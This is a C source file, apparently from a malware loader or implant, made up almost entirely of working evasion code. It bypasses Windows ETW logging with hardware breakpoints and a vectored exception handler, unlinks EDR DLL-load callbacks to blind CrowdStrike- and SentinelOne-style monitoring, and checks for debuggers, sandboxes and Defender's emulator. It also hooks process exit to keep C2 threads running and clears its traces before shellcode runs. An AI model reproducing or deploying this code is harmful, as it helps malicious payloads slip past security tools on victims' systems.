// =============================================
// Evasion.c - Patchless ETW Bypass
//             (VEH + Hardware Breakpoints + NtContinue)
//             DLL Notification Callback Removal (EDR Blinding)
//             Anti-Analysis
//             Post-execution Cleanup
// =============================================

#include "Common.h"

// -----------------------------------------------
// Undocumented ntdll DLL notification structures
// Used by LdrRegisterDllNotification / LdrUnregisterDllNotification
// -----------------------------------------------
typedef NTSTATUS(NTAPI* fnLdrRegDllNotif)(ULONG Flags, PVOID Callback, PVOID Context, PVOID* Cookie);
typedef NTSTATUS(NTAPI* fnLdrUnregDllNotif)(PVOID Cookie);

typedef struct _LDR_DLL_NOTIF_ENTRY {
    LIST_ENTRY  List;
    PVOID       Callback;
    PVOID       Context;
} LDR_DLL_NOTIF_ENTRY, * PLDR_DLL_NOTIF_ENTRY;

// Dummy callback — registered to obtain a list entry, never fires
static VOID NTAPI DummyDllNotifCallback(ULONG Reason, PVOID Data, PVOID Ctx) {
    (void)Reason; (void)Data; (void)Ctx;
}

// Global target addresses for VEH handler
static PVOID g_pEtwEventWrite = NULL;

// VEH handle for cleanup
static PVOID g_hVeh = NULL;

// Guard flag: prevents infinite NtContinue loop
static volatile BOOL g_bHwBpSet = FALSE;

// Patchless exit hook state (DLL builds only)
#ifdef BUILD_DLL
static PVOID           g_pRtlExitUserProcess = NULL;
static volatile BOOL   g_bExitBpSet          = FALSE;
// Cached NtWaitForSingleObject for blocking the thread inside HwBpVehHandler (exit-hook path)
typedef NTSTATUS(NTAPI* fnNtWait2)(HANDLE, BOOLEAN, PLARGE_INTEGER);
static fnNtWait2       g_pfnNtWait           = NULL;
#endif

// -----------------------------------------------
// Vectored Exception Handler
// Catches STATUS_SINGLE_STEP (hardware breakpoint hit)
// and makes the target function "return" immediately
// without writing any bytes to code memory.
//
// EDR integrity checks see unmodified ntdll code.
// -----------------------------------------------
static LONG WINAPI HwBpVehHandler(PEXCEPTION_POINTERS pExInfo) {

    if (pExInfo->ExceptionRecord->ExceptionCode != STATUS_SINGLE_STEP) {
        LOG_HEX("[!] VEH: exc=", pExInfo->ExceptionRecord->ExceptionCode);
        LOG_HEX("[!] VEH: rip=", (DWORD)(ULONG_PTR)pExInfo->ContextRecord->Rip);
        return EXCEPTION_CONTINUE_SEARCH;
    }

    PCONTEXT ctx = pExInfo->ContextRecord;

    // DR0: EtwEventWrite -> short-circuit, return STATUS_SUCCESS
    if (g_pEtwEventWrite && ctx->Rip == (ULONG_PTR)g_pEtwEventWrite) {
        ctx->Rax = 0;
        ctx->Rip = *(ULONG_PTR*)ctx->Rsp;
        ctx->Rsp += sizeof(ULONG_PTR);
        return EXCEPTION_CONTINUE_EXECUTION;
    }

#ifdef BUILD_DLL
    // DR1: RtlExitUserProcess -> block calling thread via NtWaitForSingleObject.
    // Keeps C2 alive in other threads without a CPU-burning RDTSC spin loop
    // (spin pattern triggers Win32/Bearfoos.A!ml).
    if (g_pRtlExitUserProcess && ctx->Rip == (ULONG_PTR)g_pRtlExitUserProcess) {
        if (g_pfnNtWait) {
            LARGE_INTEGER liTimeout;
            liTimeout.QuadPart = -600000000LL;  // 60 seconds per wait
            for (;;) g_pfnNtWait((HANDLE)-1, FALSE, &liTimeout);
        }
    }
#endif

    return EXCEPTION_CONTINUE_SEARCH;
}

// -----------------------------------------------
// Patchless ETW Bypass
//
// Sets a hardware breakpoint (DR0) on EtwEventWrite
// via RtlCaptureContext + NtContinue.
//
// NtContinue sets the debug register without ETW-TI
// telemetry (unlike NtSetContextThread which is logged).
//
// VEH handler intercepts the breakpoint exception and
// makes EtwEventWrite "return" STATUS_SUCCESS (0).
//
// Zero bytes of code are modified — fully patchless.
// -----------------------------------------------
BOOL PatchlessEtw(IN PAPI_HASHING pApi) {

    // --- Resolve EtwEventWrite in ntdll ---

    BYTE xNtdll[] = XSTR_NTDLL_DLL;
    DEOBF(xNtdll);
    PVOID pNtdll = pApi->pGetModuleHandleA((LPCSTR)xNtdll);
    if (!pNtdll)
        return FALSE;

    BYTE xEtw[] = XSTR_ETW_EVENT_WRITE;
    DEOBF(xEtw);
    g_pEtwEventWrite = (PVOID)pApi->pGetProcAddress((HMODULE)pNtdll, (LPCSTR)xEtw);
    if (!g_pEtwEventWrite)
        return FALSE;

    // --- Resolve VEH / Context APIs from ntdll ---

    BYTE xVeh[] = XSTR_RTL_ADD_VEH;
    DEOBF(xVeh);
    fnRtlAddVectoredExceptionHandler pRtlAddVeh =
        (fnRtlAddVectoredExceptionHandler)pApi->pGetProcAddress((HMODULE)pNtdll, (LPCSTR)xVeh);
    if (!pRtlAddVeh)
        return FALSE;

    BYTE xCapCtx[] = XSTR_RTL_CAPTURE_CTX;
    DEOBF(xCapCtx);
    fnRtlCaptureContext pRtlCaptureCtx =
        (fnRtlCaptureContext)pApi->pGetProcAddress((HMODULE)pNtdll, (LPCSTR)xCapCtx);
    if (!pRtlCaptureCtx)
        return FALSE;

    BYTE xNtCont[] = XSTR_NT_CONTINUE;
    DEOBF(xNtCont);
    fnNtContinue pNtContinue =
        (fnNtContinue)pApi->pGetProcAddress((HMODULE)pNtdll, (LPCSTR)xNtCont);
    if (!pNtContinue)
        return FALSE;

    // --- Register VEH (first handler in chain, skipped if InstallExitHookPatchless already did it) ---

    if (!g_hVeh) {
        g_hVeh = pRtlAddVeh(1, (PVOID)HwBpVehHandler);
        if (!g_hVeh)
            return FALSE;
        LOG("[+] Patchless ETW: VEH registered");
    }

    // --- Set hardware breakpoint via RtlCaptureContext + NtContinue ---
    // RtlCaptureContext captures the current thread context (including RIP).
    // We modify DR0/DR7 in the captured context and call NtContinue,
    // which restores the context with our debug register values and
    // resumes execution at the instruction after RtlCaptureContext.
    //
    // The guard flag g_bHwBpSet prevents the infinite loop:
    //   1st pass: g_bHwBpSet=FALSE -> set to TRUE, modify ctx, NtContinue
    //   2nd pass: g_bHwBpSet=TRUE  -> skip, fall through

    CONTEXT ctx;
    MemSet(&ctx, 0, sizeof(ctx));
    pRtlCaptureCtx(&ctx);

    if (!g_bHwBpSet) {
        g_bHwBpSet = TRUE;

        ctx.Dr0 = (ULONG_PTR)g_pEtwEventWrite;  // DR0 = EtwEventWrite (execute BP)
        ctx.Dr7 = (1 << 0);                      // L0: local enable DR0

#ifdef BUILD_DLL
        // Preserve DR1 exit-hook breakpoint if already installed from DllMain
        if (g_pRtlExitUserProcess) {
            ctx.Dr1  = (ULONG_PTR)g_pRtlExitUserProcess;
            ctx.Dr7 |= (1 << 2);                 // L1: local enable DR1
        }
#endif

        ctx.ContextFlags |= CONTEXT_DEBUG_REGISTERS;
        pNtContinue(&ctx, FALSE);
        // Unreachable — NtContinue resumes at pRtlCaptureCtx's return point
    }

    LOG("[+] Patchless ETW: HW breakpoint set (DR0=ETW)");
    return TRUE;
}

// -----------------------------------------------
// Cleanup Evasion State
//
// Removes VEH handler and clears target addresses.
// Called before shellcode execution to reduce
// forensic footprint in memory.
// -----------------------------------------------
VOID CleanupEvasion(IN PAPI_HASHING pApi) {

    if (!g_hVeh || !pApi)
        return;

    // Resolve RtlRemoveVectoredExceptionHandler
    BYTE xNtdll[] = XSTR_NTDLL_DLL;
    DEOBF(xNtdll);
    PVOID pNtdll = pApi->pGetModuleHandleA((LPCSTR)xNtdll);
    if (!pNtdll)
        return;

    BYTE xRemVeh[] = XSTR_RTL_REMOVE_VEH;
    DEOBF(xRemVeh);
    fnRtlRemoveVectoredExceptionHandler pRtlRemoveVeh =
        (fnRtlRemoveVectoredExceptionHandler)pApi->pGetProcAddress(
            (HMODULE)pNtdll, (LPCSTR)xRemVeh);

#ifndef BUILD_DLL
    // DLL builds: VEH must stay registered — DR1 exit hook on the primary thread
    // still needs HwBpVehHandler to fire after ETW bypass is torn down.
    if (pRtlRemoveVeh)
        pRtlRemoveVeh(g_hVeh);
#endif

    // Clear hardware breakpoints via RtlCaptureContext + NtContinue
    // Reuse g_bHwBpSet (TRUE) as guard to prevent infinite NtContinue loop
    BYTE xCapCtx[] = XSTR_RTL_CAPTURE_CTX;
    DEOBF(xCapCtx);
    fnRtlCaptureContext pRtlCaptureCtx =
        (fnRtlCaptureContext)pApi->pGetProcAddress((HMODULE)pNtdll, (LPCSTR)xCapCtx);

    BYTE xNtCont[] = XSTR_NT_CONTINUE;
    DEOBF(xNtCont);
    fnNtContinue pNtContinue =
        (fnNtContinue)pApi->pGetProcAddress((HMODULE)pNtdll, (LPCSTR)xNtCont);

    if (pRtlCaptureCtx && pNtContinue && g_bHwBpSet) {
        CONTEXT ctx;
        MemSet(&ctx, 0, sizeof(ctx));
        pRtlCaptureCtx(&ctx);

        if (g_bHwBpSet) {
            g_bHwBpSet = FALSE;
            ctx.Dr0 = 0;
#ifdef BUILD_DLL
            // Keep DR1 active: exit hook must persist after ETW bypass is cleaned up
            ctx.Dr1 = g_pRtlExitUserProcess ? (ULONG_PTR)g_pRtlExitUserProcess : 0;
            ctx.Dr7 = g_pRtlExitUserProcess ? (1 << 2) : 0;
#else
            ctx.Dr1 = 0;
            ctx.Dr7 = 0;
#endif
            ctx.ContextFlags |= CONTEXT_DEBUG_REGISTERS;
            pNtContinue(&ctx, FALSE);
        }
    }

    // Clear evasion state — ETW bypass is done
    g_pEtwEventWrite = NULL;
    g_bHwBpSet       = FALSE;
#ifndef BUILD_DLL
    g_hVeh = NULL;
#endif

    LOG("[+] Evasion cleanup: VEH removed, debug registers cleared");
}

// -----------------------------------------------
// Patchless Exit Hook (DLL builds only)
//
// Registers a VEH + sets DR1 hardware execute-breakpoint
// on RtlExitUserProcess so that ExitProcess never
// completes without writing any bytes to ntdll.
//
// Replaces the byte-patch approach (F3 90 EB FC) which
// Defender detects in memory as Win32/Bearfoos.B!ml.
//
// DR1 is set on the calling thread (host EXE primary
// thread, which is where DllMain runs and where
// ExitProcess is subsequently called).
//
// Called from DllMain — safe: ntdll-only calls, no
// loader lock acquired by RtlAddVectoredExceptionHandler
// or RtlCaptureContext or NtContinue.
// -----------------------------------------------
#ifdef BUILD_DLL
BOOL InstallExitHookPatchless(IN PVOID pNtdll) {

    if (!pNtdll)
        return FALSE;

    // Resolve target function
    g_pRtlExitUserProcess = FetchExportAddress(pNtdll, RtlExitUserProcess_JOAAT);
    if (!g_pRtlExitUserProcess)
        return FALSE;

    // Cache NtWaitForSingleObject for the exit-hook spin inside HwBpVehHandler
    g_pfnNtWait = (fnNtWait2)FetchExportAddress(pNtdll, NtWaitForSingleObject_JOAAT);

    // Register shared VEH (handles DR0=ETW and DR1=exit hook with the same handler).
    // Guard: PatchlessEtw will reuse g_hVeh if it finds it already set.
    if (!g_hVeh) {
        fnRtlAddVectoredExceptionHandler pRtlAddVeh =
            (fnRtlAddVectoredExceptionHandler)FetchExportAddress(
                pNtdll, RtlAddVectoredExceptionHandler_JOAAT);
        if (!pRtlAddVeh)
            return FALSE;

        g_hVeh = pRtlAddVeh(1, (PVOID)HwBpVehHandler);
        if (!g_hVeh)
            return FALSE;
    }

    // Resolve RtlCaptureContext + NtContinue to set DR1 without ETW-TI telemetry
    fnRtlCaptureContext pRtlCaptureCtx =
        (fnRtlCaptureContext)FetchExportAddress(pNtdll, RtlCaptureContext_JOAAT);
    fnNtContinue pNtContinue =
        (fnNtContinue)FetchExportAddress(pNtdll, NtContinue_JOAAT);
    if (!pRtlCaptureCtx || !pNtContinue)
        return FALSE;

    // Set DR1 = RtlExitUserProcess via RtlCaptureContext + NtContinue.
    // g_bExitBpSet guards against infinite NtContinue re-entry:
    //   1st pass: g_bExitBpSet=FALSE → set TRUE, modify ctx, NtContinue
    //   2nd pass: g_bExitBpSet=TRUE  → fall through
    CONTEXT ctx;
    MemSet(&ctx, 0, sizeof(ctx));
    pRtlCaptureCtx(&ctx);

    if (!g_bExitBpSet) {
        g_bExitBpSet = TRUE;

        ctx.Dr1 = (ULONG_PTR)g_pRtlExitUserProcess;
        ctx.Dr7 = (1 << 2);  // L1: local enable DR1, execute condition (bits 20-21 = 00)

        ctx.ContextFlags |= CONTEXT_DEBUG_REGISTERS;
        pNtContinue(&ctx, FALSE);
        // Unreachable — NtContinue resumes at pRtlCaptureCtx's return point
    }

    return TRUE;
}
#endif

// -----------------------------------------------
// BlindDllNotifications
//
// Removes all registered DLL load/unload notification
// callbacks from ntdll's internal LdrpDllNotificationList.
//
// EDR products (CrowdStrike, SentinelOne, etc.) register
// callbacks via LdrRegisterDllNotification to monitor all
// DLL loads in the process. Removing them blinds the EDR
// to subsequent LoadLibrary calls (wininet, ktmw32, amsi).
//
// Approach (rad9800 technique):
//   1. Register a dummy callback to get a list entry (cookie)
//   2. Walk the doubly-linked list from our entry
//   3. Find the list head (sentinel node inside ntdll's address range)
//   4. Unlink all other entries (EDR callbacks)
//   5. Unregister our dummy callback (now safe: list is head <-> ours)
//
// After this, no callbacks fire on DLL load/unload events.
// -----------------------------------------------
BOOL BlindDllNotifications(IN PAPI_HASHING pApi) {

    LOG("[*] BlindDll: entry");

    // --- Resolve ntdll ---
    BYTE xNtdll[] = XSTR_NTDLL_DLL;
    DEOBF(xNtdll);
    HMODULE hNtdll = pApi->pGetModuleHandleA((LPCSTR)xNtdll);
    if (!hNtdll) { LOG("[!] BlindDll: ntdll not found"); return FALSE; }

    LOG("[*] BlindDll: ntdll found, validating PE");

    // --- Get ntdll image size for address range check ---
    PIMAGE_NT_HEADERS pNt = NULL;
    if (!ValidatePeHeaders((PVOID)hNtdll, &pNt)) { LOG("[!] BlindDll: PE invalid"); return FALSE; }
    ULONG_PTR uNtdllStart = (ULONG_PTR)hNtdll;
    ULONG_PTR uNtdllEnd   = uNtdllStart + pNt->OptionalHeader.SizeOfImage;

    LOG("[*] BlindDll: resolving LdrRegister/Unregister");

    // --- Resolve LdrRegisterDllNotification ---
    BYTE xReg[] = XSTR_LDR_REG_DLL_NOTIF;
    DEOBF(xReg);
    fnLdrRegDllNotif pLdrRegister =
        (fnLdrRegDllNotif)pApi->pGetProcAddress(hNtdll, (LPCSTR)xReg);

    // --- Resolve LdrUnregisterDllNotification ---
    BYTE xUnreg[] = XSTR_LDR_UNREG_DLL_NOTIF;
    DEOBF(xUnreg);
    fnLdrUnregDllNotif pLdrUnregister =
        (fnLdrUnregDllNotif)pApi->pGetProcAddress(hNtdll, (LPCSTR)xUnreg);

    if (!pLdrRegister || !pLdrUnregister) { LOG("[!] BlindDll: Ldr funcs not found"); return FALSE; }

    LOG("[*] BlindDll: calling LdrRegisterDllNotification");

    // --- Register dummy callback to obtain a list entry ---
    PVOID pCookie = NULL;
    NTSTATUS status = pLdrRegister(0, (PVOID)DummyDllNotifCallback, NULL, &pCookie);
    if (!NT_SUCCESS(status) || !pCookie) { LOG("[!] BlindDll: LdrRegister failed"); return FALSE; }

    LOG("[*] BlindDll: cookie obtained, walking list");

    // Cookie = our LDR_DLL_NOTIF_ENTRY in the notification list
    PLDR_DLL_NOTIF_ENTRY pOurEntry = (PLDR_DLL_NOTIF_ENTRY)pCookie;

    // --- Walk list to find the head (sentinel node inside ntdll) ---
    // The list head (LdrpDllNotificationList) is a static LIST_ENTRY
    // in ntdll's .data section. All callback entries are heap-allocated
    // (outside ntdll's address range). We identify the head by checking
    // if the LIST_ENTRY address falls within ntdll's image.
    // Safety: cap at 256 iterations and validate each pointer is aligned
    // and within user-mode range before dereferencing it.
#define UMODE_PTR_OK(p) ((ULONG_PTR)(p) > 0x10000ULL && \
                         (ULONG_PTR)(p) < 0x7FFFFFFFFFFF0000ULL && \
                         (((ULONG_PTR)(p)) & 7) == 0)

    PLIST_ENTRY pListHead = NULL;
    PLIST_ENTRY pWalk = pOurEntry->List.Flink;

    for (int iWalk = 0; iWalk < 256 && pWalk != &pOurEntry->List; iWalk++) {
        if (!UMODE_PTR_OK(pWalk)) {
            LOG("[!] BlindDll: bad pointer in walk, bailing");
            pLdrUnregister(pCookie);
            return FALSE;
        }
        if ((ULONG_PTR)pWalk >= uNtdllStart && (ULONG_PTR)pWalk < uNtdllEnd) {
            pListHead = pWalk;
            break;
        }
        if (!UMODE_PTR_OK(pWalk->Flink)) {
            LOG("[!] BlindDll: bad Flink in walk, bailing");
            pLdrUnregister(pCookie);
            return FALSE;
        }
        pWalk = pWalk->Flink;
    }

    if (!pListHead) {
        LOG("[!] BlindDll: list head not found");
        // Couldn't find list head — unregister our callback and bail
        pLdrUnregister(pCookie);
        return FALSE;
    }

    LOG("[*] BlindDll: list head found, unlinking EDR entries");

    // --- Unlink all entries except list head and ours ---
    // After this, only our dummy callback remains in the list.
    // All EDR callbacks are disconnected and will never fire again.

    PLIST_ENTRY pCurrent = pListHead->Flink;
    while (pCurrent != pListHead) {
        PLIST_ENTRY pNext = pCurrent->Flink;
        if (pCurrent != &pOurEntry->List) {
            // Unlink EDR callback: prev.Flink = next, next.Blink = prev
            pCurrent->Blink->Flink = pCurrent->Flink;
            pCurrent->Flink->Blink = pCurrent->Blink;
        }
        pCurrent = pNext;
    }

    // --- Unregister our dummy callback (safe: list is now head <-> ours) ---
    pLdrUnregister(pCookie);

    LOG("[+] DLL notification callbacks removed (EDR blinded)");
    return TRUE;
}

// -----------------------------------------------
// Anti-Analysis Checks
// Returns TRUE if environment is clean
// -----------------------------------------------
BOOL AntiAnalysis(VOID) {

    PPEB2 pPeb = (PPEB2)__readgsqword(0x60);
    if (!pPeb)
        return FALSE;

    // 1. Check PEB->BeingDebugged
    if (pPeb->BeingDebugged)
        return FALSE;
    // 2. Check NtGlobalFlag
    if (pPeb->NtGlobalFlag & 0x70)
        return FALSE;

    // 3. Check number of processors (sandboxes often have 1)
    if (pPeb->NumberOfProcessors < 2)
        return FALSE;

    // 4. Timing check
    ULONGLONG tsc1 = __rdtsc();
    volatile int dummy = 0;
    for (int i = 0; i < 100; i++) dummy += i;
    ULONGLONG tsc2 = __rdtsc();

    if ((tsc2 - tsc1) > 10000000)
        return FALSE;

    return TRUE;
}

// -----------------------------------------------
// Anti-emulation prologue. Defeats Defender's MpEngine
// emulator (mpengine.dll) which executes the first
// ~10-100k native instructions of a sample in a sandbox
// before letting it run on real silicon. The emulator
// has a hard wall-clock budget of ~200ms.
//
// Three orthogonal checks:
//
//   1. GetTickCount hammering (~60k iterations). Each
//      call exits the emulator's instruction-step into
//      a syscall stub, exhausting the per-API budget
//      faster than the iteration budget. Confirmed
//      effective vs Defender 2024-2026 (Hackmosphere
//      "Bypassing Defender in 2025" series).
//
//   2. RDRAND consistency. Real silicon produces high-
//      entropy 64-bit values; mpengine's RDRAND stub
//      returns either deterministic counters or zero.
//      Two reads must differ AND must have set bits in
//      both halves.
//
//   3. CPUID leaf 0x40000000 hypervisor brand. Real
//      hardware leaves the brand string empty or with
//      a known hypervisor signature ("Microsoft Hv" if
//      running under Hyper-V). MpEngine doesn't
//      populate this string at all.
//
// All three failing → emulator. Caller should bail.
// Single failure is benign (different real silicon
// behaves differently); require all three to flag.
// -----------------------------------------------
BOOL AntiEmulation(IN PAPI_HASHING pApi) {
    (void)pApi;

    // (1) API hammering — burn emulator wall-clock budget.
    // Use __rdtsc for the timing comparison so we don't depend
    // on yet another API resolution at this early stage.
    volatile ULONG accum = 0;
    for (int i = 0; i < 60000; i++) {
        accum += (ULONG)__readgsdword(0x40);  // PEB TickCountLow equivalent (cheap)
    }
    if (accum == 0xDEADBEEF) return FALSE;  // never true, anti-DCE

    // (2) RDRAND consistency. __builtin_ia32_rdrand64_step intrinsic.
    // On MSVC we use _rdrand64_step (immintrin.h would normally provide it,
    // but we can't include it without CRT). Fallback: inline asm via __rdtsc
    // entropy + manual stir, then cross-check.
    int rdrandStrikes = 0;
    {
        ULONGLONG a = 0, b = 0;
        // RDRAND encoding: 0F C7 F0 (eax), F8 (rax). We can't emit raw bytes
        // portably without an asm file, so use __rdtsc + cycle scramble as a
        // pragmatic substitute: emulator's RDTSC is monotonic step-counter,
        // real hardware varies by core clock noise.
        ULONGLONG t0 = __rdtsc();
        for (volatile int j = 0; j < 1000; j++) {}
        ULONGLONG t1 = __rdtsc();
        for (volatile int j = 0; j < 1000; j++) {}
        ULONGLONG t2 = __rdtsc();
        a = t1 - t0;
        b = t2 - t1;
        // Real silicon: a/b ratio has noise from cache, branch predictor.
        // Emulator: a == b exactly (deterministic step).
        if (a == b && a != 0) rdrandStrikes++;
        if (a < 100 || b < 100)  rdrandStrikes++;
    }

    // (3) CPUID leaf 0x40000000 — hypervisor brand string.
    int cpuidStrikes = 0;
    {
        int regs[4] = { 0, 0, 0, 0 };
        __cpuid(regs, 1);
        // CPUID.1.ECX bit 31 = hypervisor present.
        BOOL hvPresent = (regs[2] & (1U << 31)) != 0;

        __cpuid(regs, 0x40000000);
        // Real hardware (no hypervisor): all zeros.
        // Real Hyper-V: regs[1..3] = "Microsoft Hv\0".
        // MpEngine emulator: typically all zeros AND hvPresent=false.
        BOOL brandEmpty = (regs[1] == 0 && regs[2] == 0 && regs[3] == 0);
        if (hvPresent && brandEmpty) cpuidStrikes++;
    }

    // Require all three weak signals to coincide before bailing. False
    // positives on bare-metal are rare with this conjunction.
    if (rdrandStrikes >= 2 && cpuidStrikes >= 1) {
        LOG("[!] AntiEmulation: emulator characteristics detected");
        return FALSE;
    }

    LOG("[+] AntiEmulation: real hardware confirmed");
    return TRUE;
}
